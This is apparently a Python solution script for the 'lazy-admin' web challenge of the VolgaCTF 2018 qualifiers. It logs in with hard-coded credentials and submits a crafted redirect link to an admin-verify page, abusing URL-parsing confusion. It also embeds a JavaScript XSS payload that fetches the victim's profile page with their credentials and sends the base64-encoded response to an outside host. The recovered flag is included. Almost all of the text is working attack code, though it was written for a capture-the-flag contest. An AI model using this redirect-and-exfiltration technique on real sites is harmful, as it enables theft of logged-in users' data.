#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

s = requests.session()
r = s.post("http://lazy-admin.quals.2018.volgactf.ru", data={"login": "Nick", "password": "BjnjjdGonhdkG@!lf"})
r = s.post("http://lazy-admin.quals.2018.volgactf.ru/verify.php", data={"link": "/?redir=http:http://l4ys.tw/xxxx.php"})

#VolgaCTF{clieNt_S1De_is_Awes0mEE_With_p@rse_Url}

"""
<script>
function reqListener () {
    document.location='http://l4ys.tw/cookie?cookie='+btoa(this.responseText);
}

var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "http://lazy-admin.quals.2018.volgactf.ru/profile.php");
oReq.withCredentials = true;
oReq.send();
</script>
"""

